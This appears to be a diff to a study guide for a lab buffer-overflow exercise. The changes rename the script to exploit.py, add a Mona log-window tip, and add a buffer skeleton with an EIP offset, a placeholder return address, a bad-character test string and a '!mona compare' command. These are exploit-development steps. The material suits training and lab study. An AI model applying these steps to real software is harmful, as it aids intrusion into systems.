@@ -79,8 +79,8 @@ $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 666 (Change
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2...
 ```
 
-Create a new script called findEIP.py
-You take the unique string character created and that becomes your new buffer in findEIP.py 
+Create a new script called exploit.py
+You take the unique string character created and that becomes your new buffer in exploit.py 
 
 
 ### Skeleton
@@ -134,7 +134,7 @@ Use mona's findmsp command, with the distance argument set to the pattern length
     EAX (0x017df764) points at offset 0 in normal pattern (length 600)
     EBP contains normal pattern : 0x41367841 (offset 108)
     ...
-
+NOTE: Mona should display a log window with the output of the command. If not, click "Window" menu and then "Log Data" to view it (Choose "CPU" to switch back to the standard view)
 
 ## Method 2
 
@@ -170,4 +170,25 @@ Now generate a string of bad chars that is identical to the bytearray. The follo
 
  print()
 ```
+
+Create a new buffer using this information to ensure that we can control EIP:
+
+```
+ prefix = ""
+ offset = 112
+ overflow = "A" * offset
+ retn = "BBBB"
+ padding = ""
+ payload = "\x01\x02\x03\x04\x05...\xfb\xfc\xfd\xfe\xff"
+ postfix = ""
+    
+ buffer = prefix + overflow + retn + padding + payload + postfix
+```
+
+Restart Immunity and run the exploit.py again. Then, use the mona compare command to reference the bytearray you generated, and the address to which ESP points:
+
+```
+!mona compare -f C:\mona\appname\bytearray.bin -a <address> (ESP address and remember change the path of the appin "appname")
+```
+
 
